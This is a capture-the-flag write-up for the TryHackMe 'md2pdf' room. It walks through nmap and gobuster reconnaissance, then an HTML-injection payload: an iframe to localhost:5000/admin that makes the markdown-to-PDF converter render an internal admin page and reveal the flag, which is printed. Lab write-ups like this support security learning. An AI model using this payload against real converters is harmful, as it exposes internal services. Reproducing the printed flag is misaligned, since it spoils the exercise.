# Room: md2pdf

## General Info
- **Room link:** [md2pdf](https://tryhackme.com/room/md2pdf)

## Description

Hello Hacker!
TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.
This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

## Provided Files / Links
- [x] Target Machine IP (10.10.110.111)

## Website analysis

It is a basic website with a text area and a button to convert the text to a PDF. Once you click on the "Convert to PDF button", you get a PDF on a webpage `http://10.10.110.111/<document-id>`.

## Enumeration / Recon
- Ports Enumeration

Basic port enumeration:
`nmap -sV 10.10.110.111`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  rtsp
5000/tcp open  rtsp
```

Note: RTSP (Real-Time Streaming Protocol) is a network protocol used to control multimedia streams such as audio and video. RTSP is commonly used for controlling live streams in devices like IP cameras and media servers and its default port is 554. 

- Directories enumeration:

`gobuster dir -u 10.10.110.111 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100`

There are 2 directories that are not accessible:

```
/admin                (Status: 403) [Size: 166]
/convert              (Status: 405) [Size: 178]
```

When accessing /admin, I get this error:

```
Forbidden
This page can only be seen internally (localhost:5000)
```

## HTML Injection

After testing some HTML tags (such as `<h1>Hello</h1>`) I noticed that the website was vulnerable to HTML injection (the `Hello` word was rendered as an h1 title in the pdf).

I then created and iframe tag to access the /admin page on port 5000 as localhost (as mentionned in the error page when trying to access /admin):

`<iframe src="http://localhost:5000/admin"</iframe>`

After creating the pdf, the flag was displayed: **flag{1f4a2b6ffeaf4707c43885d704eaee4b}**.